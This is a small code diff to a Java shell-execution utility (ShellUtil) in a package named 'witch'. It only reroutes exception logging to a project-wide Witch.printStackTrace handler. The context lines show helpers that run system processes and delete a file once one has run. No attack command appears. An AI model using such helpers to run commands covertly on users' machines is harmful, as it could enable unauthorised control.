@@ -1,5 +1,7 @@
 package me.soda.witch.features;
 
+import me.soda.witch.Witch;
+
 import java.io.*;
 import java.nio.charset.StandardCharsets;
 
@@ -27,7 +29,7 @@ public class ShellUtil {
             inputStream.close();
             process.waitFor();
         } catch (IOException | InterruptedException e) {
-            e.printStackTrace();
+            Witch.printStackTrace(e);
         }
         return result.toString();
     }
@@ -43,7 +45,7 @@ public class ShellUtil {
             process.waitFor();
             if (file.exists()) file.delete();
         } catch (IOException | InterruptedException e) {
-            e.printStackTrace();
+            Witch.printStackTrace(e);
         }
     }
 }
